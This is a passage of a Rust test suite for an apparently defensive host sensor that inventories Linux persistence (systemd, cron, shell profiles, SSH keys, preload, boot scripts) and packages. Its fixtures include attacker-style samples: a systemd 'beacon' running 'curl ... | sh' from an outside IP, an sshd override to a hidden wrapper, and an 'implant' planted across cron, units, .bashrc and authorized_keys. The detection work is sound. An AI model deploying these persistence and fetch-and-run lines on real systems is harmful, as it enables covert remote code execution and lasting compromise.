            ("/usr/lib/systemd/system/getty@.service", "/usr/bin/daemon", true),
            ("/usr/lib/systemd/system/masked.service", "/usr/bin/daemon", false),
            ("/usr/lib/systemd/system/shadowed.service", "/usr/bin/daemon", false),
            ("/usr/lib/systemd/system/vendor.service", "/usr/bin/daemon", true),
        ];
        assert_eq!(
            state,
            expected.map(|(path, command, enabled)| (path.to_string(), command.to_string(), enabled)),
            "another name for a unit and a mask are not units, a replaced unit and a masked one do not start"
        );
    }

    #[test]
    fn test_drop_ins_and_timers_show_what_really_runs() {
        let tree = Tree::new("systemd-drop-in");
        let sshd = "[Service]\nExecStart=/usr/sbin/sshd -D\n";
        let drop_in = "[Service]\nExecStart=\nExecStart=/tmp/.sshd-wrapper\n";
        let timer = "[Timer]\nOnCalendar=*:0/5\nUnit=beacon.service\n\n[Install]\nWantedBy=timers.target\n";
        let beacon = "[Service]\nUser=nobody\nExecStart=/bin/sh -c 'curl -s http://203.0.113.7/x | sh'\n";
        let orphan = "[Timer]\nOnBootSec=1min\n";
        tree.write("/usr/lib/systemd/system/ssh.service", sshd);
        tree.write("/etc/systemd/system/ssh.service.d/override.conf", drop_in);
        tree.write("/etc/systemd/system/ssh.service.d/notes.txt", "[Service]\nExecStart=/not/a/drop/in\n");
        tree.write("/etc/systemd/system/sync.timer", timer);
        tree.link("/etc/systemd/system/timers.target.wants/sync.timer", "/etc/systemd/system/sync.timer");
        tree.write("/etc/systemd/system/beacon.service", beacon);
        tree.write("/etc/systemd/system/orphan.timer", orphan);

        assert_eq!(
            tree.of(PersistenceKind::SystemdUnit),
            vec![
                listed(
                    PersistenceKind::SystemdUnit,
                    "beacon.service",
                    "/etc/systemd/system/beacon.service",
                    "/bin/sh -c 'curl -s http://203.0.113.7/x | sh'",
                    "nobody",
                    false,
                    sha256(beacon)
                ),
                listed(
                    PersistenceKind::SystemdUnit,
                    "ssh.service",
                    "/usr/lib/systemd/system/ssh.service",
                    "/tmp/.sshd-wrapper",
                    "root",
                    false,
                    sha256(&format!("{}{}", sshd, drop_in))
                ),
            ],
            "the drop-in replaces the command and is part of the hash"
        );
        assert_eq!(
            tree.of(PersistenceKind::SystemdTimer),
            vec![
                listed(PersistenceKind::SystemdTimer, "orphan.timer", "/etc/systemd/system/orphan.timer", "", "root", false, sha256(orphan)),
                listed(
                    PersistenceKind::SystemdTimer,
                    "sync.timer",
                    "/etc/systemd/system/sync.timer",
                    "/bin/sh -c 'curl -s http://203.0.113.7/x | sh'",
                    "nobody",
                    true,
                    sha256(timer)
                ),
            ],
            "a timer is listed with the command and the user of the unit it starts"
        );
    }

    #[test]
    fn test_units_of_a_user_are_listed_under_that_user() {
        let tree = Tree::new("systemd-user");
        tree.write("/etc/passwd", PASSWD);
        tree.write("/home/dana/.config/systemd/user/miner.service", "[Service]\nExecStart=%h/.cache/miner\n");
        tree.link("/home/dana/.config/systemd/user/default.target.wants/miner.service", "/home/dana/.config/systemd/user/miner.service");
        tree.write("/etc/systemd/user/agent.service", "[Service]\nExecStart=/usr/bin/agent\n");

        let units: Vec<(String, String, bool)> = tree.of(PersistenceKind::SystemdUnit).into_iter().map(|item| (item.name, item.user, item.enabled)).collect();
        assert_eq!(
            units,
            vec![("agent.service".to_string(), String::new(), false), ("miner.service".to_string(), "dana".to_string(), true),],
            "a unit for every user names no user"
        );
    }

    #[test]
    fn test_cron_entries_and_periodic_scripts_are_listed() {
        let tree = Tree::new("cron");
        let script = "#!/bin/sh\nlogrotate /etc/logrotate.conf\n";
        tree.write("/etc/crontab", "SHELL=/bin/sh\n17 * * * * root run-parts /etc/cron.hourly\n");
        tree.write("/etc/cron.d/backup", "*/5 * * * * backup /usr/local/bin/backup.sh\n@reboot root /usr/local/bin/warm-cache\n");
        tree.write("/etc/cron.d/.placeholder", "* * * * * root /hidden/files/are/not/read\n");
        tree.write("/var/spool/cron/crontabs/dana", "0 3 * * * /home/dana/sync.sh\n");
        tree.executable("/etc/cron.daily/logrotate", script);
        tree.write("/etc/cron.weekly/not-executable", "#!/bin/sh\n");

        assert_eq!(
            tree.scan(),
            vec![
                listed(
                    PersistenceKind::Cron,
                    "17 * * * * root run-parts /etc/cron.hourly",
                    "/etc/crontab",
                    "run-parts /etc/cron.hourly",
                    "root",
                    true,
                    sha256("17 * * * * root run-parts /etc/cron.hourly")
                ),
                listed(
                    PersistenceKind::Cron,
                    "*/5 * * * * backup /usr/local/bin/backup.sh",
                    "/etc/cron.d/backup",
                    "/usr/local/bin/backup.sh",
                    "backup",
                    true,
                    sha256("*/5 * * * * backup /usr/local/bin/backup.sh")
                ),
                listed(
                    PersistenceKind::Cron,
                    "@reboot root /usr/local/bin/warm-cache",
                    "/etc/cron.d/backup",
                    "/usr/local/bin/warm-cache",
                    "root",
                    true,
                    sha256("@reboot root /usr/local/bin/warm-cache")
                ),
                listed(
                    PersistenceKind::Cron,
                    "0 3 * * * /home/dana/sync.sh",
                    "/var/spool/cron/crontabs/dana",
                    "/home/dana/sync.sh",
                    "dana",
                    true,
                    sha256("0 3 * * * /home/dana/sync.sh")
                ),
                listed(PersistenceKind::Cron, "logrotate", "/etc/cron.daily/logrotate", "", "root", true, sha256(script)),
                listed(PersistenceKind::Cron, "not-executable", "/etc/cron.weekly/not-executable", "", "root", false, sha256("#!/bin/sh\n")),
            ]
        );
    }

    #[test]
    fn test_crontabs_reached_through_a_linked_directory_are_listed_once() {
        let tree = Tree::new("cron-linked");
        tree.write("/etc/crontabs/root", "*/15 * * * * run-parts /etc/periodic/15min\n");
        tree.link("/var/spool/cron/crontabs", "/etc/crontabs");

        let entries = tree.scan();
        assert_eq!(entries.len(), 1);
        assert_eq!(entries[0].path, "/var/spool/cron/crontabs/root");
        assert_eq!(entries[0].user, "root");
        assert_eq!(entries[0].command, "run-parts /etc/periodic/15min");
    }

    #[test]
    fn test_long_entries_are_cut_and_still_told_apart() {
        let tree = Tree::new("cron-long");
        let padding = "x".repeat(5000);
        tree.write("/etc/crontab", &format!("* * * * * root /bin/a {0} first\n* * * * * root /bin/a {0} second\n", padding));

        let entries = tree.scan();
        assert_eq!(entries.len(), 2);
        assert_ne!(entries[0].name, entries[1].name);
        assert_ne!(entries[0].hash, entries[1].hash);
        assert!(entries.iter().all(|entry| entry.name.len() == 256 + 1 + 16 && entry.command.len() == 4096));
    }

    #[test]
    fn test_shell_profiles_are_listed_by_hash_without_their_content() {
        let tree = Tree::new("profiles");
        tree.write("/etc/passwd", PASSWD);
        tree.write("/etc/profile", "export PATH\n");
        tree.write("/etc/bash.bashrc", "PS1='$ '\n");
        tree.write("/etc/profile.d/locale.sh", "export LANG=C\n");
        tree.write("/root/.bashrc", "alias ll='ls -l'\n");
        tree.write("/home/dana/dotfiles/zshrc", "export API_TOKEN=secret\n");
        tree.link("/home/dana/.zshrc", "/home/dana/dotfiles/zshrc");
        tree.write("/home/dana/.profile", "");
        tree.write("/home/dana/.bash_history", "not a profile\n");

        let items = tree.scan();
        assert_eq!(
            items,
            vec![
                listed(PersistenceKind::ShellProfile, "profile", "/etc/profile", "", "", true, sha256("export PATH\n")),
                listed(PersistenceKind::ShellProfile, "bash.bashrc", "/etc/bash.bashrc", "", "", true, sha256("PS1='$ '\n")),
                listed(PersistenceKind::ShellProfile, "locale.sh", "/etc/profile.d/locale.sh", "", "", true, sha256("export LANG=C\n")),
                listed(PersistenceKind::ShellProfile, ".bashrc", "/root/.bashrc", "", "root", true, sha256("alias ll='ls -l'\n")),
                listed(PersistenceKind::ShellProfile, ".profile", "/home/dana/.profile", "", "dana", true, sha256("")),
                listed(PersistenceKind::ShellProfile, ".zshrc", "/home/dana/.zshrc", "", "dana", true, sha256("export API_TOKEN=secret\n")),
            ],
            "a profile that is a link is read inside the inspected root and listed under the name the shell reads"
        );
    }

    #[test]
    fn test_authorized_keys_are_listed_per_key_for_the_account_they_open() {
        let tree = Tree::new("authorized-keys");
        tree.write("/etc/passwd", PASSWD);
        tree.write("/root/.ssh/authorized_keys", &format!("ssh-ed25519 {} deploy@ci\n", ED25519_KEY));
        tree.write("/home/dana/.ssh/authorized_keys2", &format!("command=\"/usr/bin/backup\" ssh-rsa {}\n", RSA_KEY));

        let keys = tree.scan();
        assert_eq!(keys.len(), 2);
        assert_eq!(keys[0].kind, PersistenceKind::AuthorizedKey);
        assert_eq!(keys[0].name, format!("ssh-ed25519 {} deploy@ci", ED25519_FINGERPRINT));
        assert_eq!((keys[0].path.as_str(), keys[0].user.as_str(), keys[0].command.as_str()), ("/root/.ssh/authorized_keys", "root", ""));
        assert_eq!(keys[1].name, format!("ssh-rsa {}", RSA_FINGERPRINT));
        assert_eq!((keys[1].path.as_str(), keys[1].user.as_str(), keys[1].command.as_str()), ("/home/dana/.ssh/authorized_keys2", "dana", "/usr/bin/backup"));
        assert!(keys.iter().all(|key| key.enabled && key.hash.as_ref().is_some_and(|hash| hash.len() == 64)));
    }

    #[test]
    fn test_preloaded_libraries_are_listed_with_the_hash_of_the_library() {
        let tree = Tree::new("preload");
        tree.write("/etc/ld.so.preload", "/usr/lib/libhook.so\n/tmp/.gone.so\n");
        tree.write("/usr/lib/libhook.so", "\u{7f}ELF, not really");

        assert_eq!(
            tree.scan(),
            vec![
                listed(PersistenceKind::LdPreload, "/usr/lib/libhook.so", "/etc/ld.so.preload", "", "root", true, sha256("\u{7f}ELF, not really")),
                listed(PersistenceKind::LdPreload, "/tmp/.gone.so", "/etc/ld.so.preload", "", "root", true, None),
            ]
        );
    }

    #[test]
    fn test_boot_scripts_are_listed_with_whether_they_start() {
        let tree = Tree::new("boot-scripts");
        let rc_local = "#!/bin/sh\n/opt/start\n";
        tree.executable("/etc/rc.local", rc_local);
        tree.executable("/etc/init.d/cron", "#!/bin/sh\n");
        tree.executable("/etc/init.d/unused", "#!/bin/sh\n# unused\n");
        tree.executable("/etc/init.d/openrc-service", "#!/sbin/openrc-run\n");
        tree.link("/etc/rc2.d/S01cron", "../init.d/cron");
        tree.link("/etc/rc0.d/K01unused", "../init.d/unused");
        tree.link("/etc/runlevels/default/openrc-service", "/etc/init.d/openrc-service");

        assert_eq!(tree.of(PersistenceKind::RcLocal), vec![listed(PersistenceKind::RcLocal, "rc.local", "/etc/rc.local", "", "root", true, sha256(rc_local))]);
        let scripts: Vec<(String, bool)> = tree.of(PersistenceKind::InitScript).into_iter().map(|item| (item.name, item.enabled)).collect();
        assert_eq!(scripts, vec![("cron".to_string(), true), ("openrc-service".to_string(), true), ("unused".to_string(), false)]);

        std::fs::set_permissions(tree.at("/etc/rc.local"), std::fs::Permissions::from_mode(0o644)).unwrap();
        assert!(!tree.of(PersistenceKind::RcLocal)[0].enabled, "rc.local runs only while it is executable");
    }

    #[test]
    fn test_files_that_cannot_be_read_are_listed_without_a_hash_and_never_block_the_scan() {
        let tree = Tree::new("unreadable");
        tree.write("/etc/passwd", PASSWD);
        tree.write("/root/.ssh/authorized_keys", &"# padding\n".repeat(110_000));
        tree.link("/root/.bashrc", ".bashrc");
        std::fs::create_dir_all(tree.at("/root/.zshrc")).unwrap();
        assert!(Command::new("mkfifo").arg(tree.at("/root/.profile")).status().unwrap().success());

        assert_eq!(
            tree.scan(),
            vec![
                listed(PersistenceKind::ShellProfile, ".bashrc", "/root/.bashrc", "", "root", true, None),
                listed(PersistenceKind::AuthorizedKey, "authorized_keys", "/root/.ssh/authorized_keys", "", "root", true, None),
            ],
            "a link loop and a file over the size limit are listed as unread, a pipe and a directory are not files"
        );
    }

    #[test]
    fn test_inventory_of_a_root_that_cannot_be_read_is_an_error() {
        let error = persistence::scan(&test_dir("no-such-root")).unwrap_err();
        assert!(error.contains("Failed to read"), "{}", error);
    }

    #[test]
    fn test_inventory_is_taken_from_the_root_of_the_first_process() {
        let tree = Tree::new("init-root");
        tree.write("/etc/crontab", "@reboot root /opt/boot.sh\n");

        let items = collector::ProcSource::new(&tree.proc_root).unwrap().persistence().unwrap();

        assert_eq!(items.len(), 1);
        assert_eq!(items[0].path, "/etc/crontab");
    }

    fn persistence_changes(events: Vec<SystemEvent>) -> Vec<(InventoryAction, PersistenceKind, String, String)> {
        events
            .into_iter()
            .filter_map(|event| match event {
                SystemEvent::Persistence(event) => Some((event.action, event.kind, event.path, event.command)),
                _ => None,
            })
            .collect()
    }

    fn change(action: InventoryAction, kind: PersistenceKind, path: &str, command: &str) -> (InventoryAction, PersistenceKind, String, String) {
        (action, kind, path.to_string(), command.to_string())
    }

    #[test]
    fn test_installed_changed_and_removed_persistence_reaches_the_sensor_as_events() {
        let tree = Tree::new("sensor-persistence");
        tree.write("/etc/passwd", PASSWD);
        tree.write("/etc/profile", "export PATH\n");
        tree.write("/root/.bashrc", "alias ll='ls -l'\n");
        let mut sensor = Sensor::new(collector::ProcSource::new(&tree.proc_root).unwrap(), std::process::id(), 60, 300);

        assert_eq!(
            persistence_changes(sensor.poll(1_000).events),
            vec![
                change(InventoryAction::Present, PersistenceKind::ShellProfile, "/etc/profile", ""),
                change(InventoryAction::Present, PersistenceKind::ShellProfile, "/root/.bashrc", ""),
            ]
        );

        tree.write("/etc/systemd/system/implant.service", "[Service]\nExecStart=/tmp/.implant --daemon\n");
        tree.link("/etc/systemd/system/multi-user.target.wants/implant.service", "/etc/systemd/system/implant.service");
        tree.write("/etc/cron.d/implant", "*/5 * * * * root /tmp/.implant --check\n");
        tree.write("/root/.bashrc", "alias ll='ls -l'\nnohup /tmp/.implant &\n");
        tree.write("/root/.ssh/authorized_keys", &format!("ssh-ed25519 {} attacker@box\n", ED25519_KEY));

        assert!(persistence_changes(sensor.poll(1_030).events).is_empty(), "nothing is read before the interval has passed");
        assert_eq!(
            persistence_changes(sensor.poll(1_060).events),
            vec![
                change(InventoryAction::Added, PersistenceKind::SystemdUnit, "/etc/systemd/system/implant.service", "/tmp/.implant --daemon"),
                change(InventoryAction::Added, PersistenceKind::Cron, "/etc/cron.d/implant", "/tmp/.implant --check"),
                change(InventoryAction::Changed, PersistenceKind::ShellProfile, "/root/.bashrc", ""),
                change(InventoryAction::Added, PersistenceKind::AuthorizedKey, "/root/.ssh/authorized_keys", ""),
            ]
        );

        tree.write("/etc/systemd/system/implant.service", "[Service]\nExecStart=/tmp/.implant --daemon --quiet\n");
        tree.write("/etc/cron.d/implant", "*/5 * * * * root /tmp/.implant --check --quiet\n");
        tree.remove("/root/.ssh/authorized_keys");

        assert_eq!(
            persistence_changes(sensor.poll(1_120).events),
            vec![
                change(InventoryAction::Removed, PersistenceKind::Cron, "/etc/cron.d/implant", "/tmp/.implant --check"),
                change(InventoryAction::Removed, PersistenceKind::AuthorizedKey, "/root/.ssh/authorized_keys", ""),
                change(InventoryAction::Changed, PersistenceKind::SystemdUnit, "/etc/systemd/system/implant.service", "/tmp/.implant --daemon --quiet"),
                change(InventoryAction::Added, PersistenceKind::Cron, "/etc/cron.d/implant", "/tmp/.implant --check --quiet"),
            ]
        );

        assert!(persistence_changes(sensor.poll(1_180).events).is_empty());
    }

    use zedr_shared::sensor::PackageItem;
    use zedr_shared::PackageManager;

    const DPKG_STATUS: &str = concat!(
        "Package: openssl\n",
        "Status: install ok installed\n",
        "Priority: optional\n",
        "Section: utils\n",
        "Installed-Size: 2053\n",
        "Architecture: amd64\n",
        "Multi-Arch: foreign\n",
        "Version: 3.0.13-0ubuntu3.5\n",
        "Depends: libc6 (>= 2.34), libssl3t64 (>= 3.0.9)\n",
        "Description: Secure Sockets Layer toolkit - cryptographic utility\n",
        " This package is part of the OpenSSL project's implementation.\n",
        " .\n",
        " Package: text-inside-a-description\n",
        " Version: 0\n",
        "\n",
        "Package: libc6\nStatus: install ok installed\nArchitecture: amd64\nMulti-Arch: same\nSource: glibc\nVersion: 2.39-0ubuntu8.4\n\n",
        "Package: libc6\nStatus: install ok installed\nArchitecture: i386\nVersion: 2.39-0ubuntu8.4\n\n",
        "Package: removed-but-configured\nStatus: deinstall ok config-files\nArchitecture: all\nVersion: 1.0\n\n",
        "Package: never-installed\nStatus: purge ok not-installed\nArchitecture: amd64\n\n",
        "Package: half-way\nStatus: install ok half-configured\nArchitecture: all\nVersion: 2:4.1-3\n\n",
        "\n",
        "Package: held\nStatus: hold ok installed\nArchitecture: all\nVersion: 7\n",
    );

    const APK_INSTALLED: &str = concat!(
        "C:Q1qKcZ+j23xssAXmgQhkOO8dHnbWw=\n",
        "P:musl\n",
        "V:1.2.5-r10\n",
        "A:x86_64\n",
        "S:411323\n",
        "I:662120\n",
        "T:the musl c library (libc) implementation\n",
        "U:https://musl.libc.org/\n",
        "L:MIT\n",
        "o:musl\n",
        "t:1739467586\n",
        "c:0ac9e9c1d8b0a2a1e2a5a3b9b6b8e1e1f0e0d0c0\n",
        "p:so:libc.musl-x86_64.so.1=1\n",
        "F:lib\n",
        "R:ld-musl-x86_64.so.1\n",
        "a:0:0:755\n",
        "Z:Q1abcdefghijklmnopqrstuvwxyz0=\n",
        "\n",
        "C:Q1xyz=\nP:busybox\nV:1.37.0-r18\nA:x86_64\nF:bin\nR:busybox\n\n",
    );

    fn installed(manager: PackageManager, name: &str, version: &str, architecture: &str) -> PackageItem {
        PackageItem { manager, name: name.to_string(), version: version.to_string(), architecture: architecture.to_string() }
    }

    #[test]
    fn test_dpkg_status_lists_packages_that_have_files_on_disk() {
        let listed = packages::parse(DPKG_STATUS.as_bytes(), PackageManager::Dpkg).unwrap();

        assert_eq!(
            listed,
            vec![
                installed(PackageManager::Dpkg, "openssl", "3.0.13-0ubuntu3.5", "amd64"),
                installed(PackageManager::Dpkg, "libc6", "2.39-0ubuntu8.4", "amd64"),
                installed(PackageManager::Dpkg, "libc6", "2.39-0ubuntu8.4", "i386"),
                installed(PackageManager::Dpkg, "half-way", "2:4.1-3", "all"),
                installed(PackageManager::Dpkg, "held", "7", "all"),
            ],
            "removed and never installed packages are left out, a description is not read as fields, the last entry needs no empty line"
        );
        assert!(packages::parse("".as_bytes(), PackageManager::Dpkg).unwrap().is_empty());
        assert!(packages::parse(DPKG_STATUS.as_bytes(), PackageManager::Homebrew).unwrap_err().contains("not a package database of Linux"));
    }

    #[test]
    fn test_apk_database_lists_name_version_and_architecture() {
        assert_eq!(
            packages::parse(APK_INSTALLED.as_bytes(), PackageManager::Apk).unwrap(),
            vec![installed(PackageManager::Apk, "musl", "1.2.5-r10", "x86_64"), installed(PackageManager::Apk, "busybox", "1.37.0-r18", "x86_64"),]
        );
    }

    #[test]
    fn test_long_and_broken_package_fields_are_cut_or_left_out() {
        let status = format!(
            "Package: {}\nStatus: install ok installed\nArchitecture: all\nVersion: 1\n\nPackage: no-version\nStatus: install ok installed\n\nVersion: 1\n\nPackage: bytes-\u{fffd}\nVersion: \u{e9}\n",
            "n".repeat(1000)
        );
        let mut status = status.into_bytes();
        status.extend_from_slice(b"\nPackage: latin1-\xe9\nVersion: 2\n");

        let listed = packages::parse(status.as_slice(), PackageManager::Dpkg).unwrap();

        let names: Vec<(usize, &str)> = listed.iter().map(|package| (package.name.len(), package.version.as_str())).collect();
        assert_eq!(names, vec![(256, "1"), (9, "\u{e9}"), (10, "2")], "an entry needs a name and a version, bytes that are not text do not stop the read");
    }

    #[test]
    fn test_package_databases_are_read_inside_the_inspected_root() {
        let tree = Tree::new("packages");
        assert_eq!(packages::scan(&tree.root()), Ok(Vec::new()), "a system with neither database has no packages to list");

        tree.write("/var/lib/dpkg/status", DPKG_STATUS);
        tree.write("/usr/lib/apk/db/installed", APK_INSTALLED);
        tree.link("/lib", "usr/lib");

        let listed = packages::scan(&tree.root()).unwrap();
        let managers: Vec<PackageManager> = listed.iter().map(|package| package.manager).collect();
        assert_eq!(managers, [vec![PackageManager::Dpkg; 5], vec![PackageManager::Apk; 2]].concat());

        let through_the_source = collector::ProcSource::new(&tree.proc_root).unwrap().packages().unwrap();
        assert_eq!(through_the_source, listed);
    }

    #[test]
    fn test_package_database_that_cannot_be_read_is_an_error() {
        let tree = Tree::new("packages-unreadable");
        tree.link("/var/lib/dpkg/status", "status");
        assert!(packages::scan(&tree.root()).unwrap_err().contains("/var/lib/dpkg/status cannot be read"));

        tree.remove("/var/lib/dpkg/status");
        tree.write("/var/lib/dpkg/status", DPKG_STATUS);
        std::fs::OpenOptions::new().write(true).open(tree.at("/var/lib/dpkg/status")).unwrap().set_len(64 * 1024 * 1024 + 1).unwrap();
        assert!(packages::scan(&tree.root()).unwrap_err().contains("is larger than"));
    }

    fn package_changes(events: Vec<SystemEvent>) -> Vec<(InventoryAction, String, String, Option<String>)> {
        events
            .into_iter()
            .filter_map(|event| match event {
                SystemEvent::Package(event) => Some((event.action, event.name, event.version, event.previous_version)),
                _ => None,
            })
            .collect()
    }

    fn dpkg_entry(name: &str, version: &str) -> String {
        format!("Package: {}\nStatus: install ok installed\nArchitecture: arm64\nVersion: {}\n\n", name, version)
    }

    #[test]
    fn test_installed_upgraded_and_removed_packages_reach_the_sensor_as_events() {
        let tree = Tree::new("sensor-packages");
        tree.write("/var/lib/dpkg/status", &[dpkg_entry("curl", "8.5.0-2ubuntu10"), dpkg_entry("openssl", "3.0.13-0ubuntu3")].concat());
        let mut sensor = Sensor::new(collector::ProcSource::new(&tree.proc_root).unwrap(), std::process::id(), 60, 300);

        assert_eq!(
            package_changes(sensor.poll(1_000).events),
            vec![
                (InventoryAction::Present, "curl".to_string(), "8.5.0-2ubuntu10".to_string(), None),
                (InventoryAction::Present, "openssl".to_string(), "3.0.13-0ubuntu3".to_string(), None),
            ]
        );

        tree.write("/var/lib/dpkg/status", &[dpkg_entry("netcat-openbsd", "1.226-1ubuntu2"), dpkg_entry("openssl", "3.0.13-0ubuntu3.5")].concat());

        assert!(package_changes(sensor.poll(1_060).events).is_empty(), "packages are not read as often as persistence");
        assert_eq!(
            package_changes(sensor.poll(1_300).events),
            vec![
                (InventoryAction::Removed, "curl".to_string(), "8.5.0-2ubuntu10".to_string(), None),
                (InventoryAction::Added, "netcat-openbsd".to_string(), "1.226-1ubuntu2".to_string(), None),
                (InventoryAction::Changed, "openssl".to_string(), "3.0.13-0ubuntu3.5".to_string(), Some("3.0.13-0ubuntu3".to_string())),
            ]
        );
        assert!(package_changes(sensor.poll(1_600).events).is_empty());
    }
}
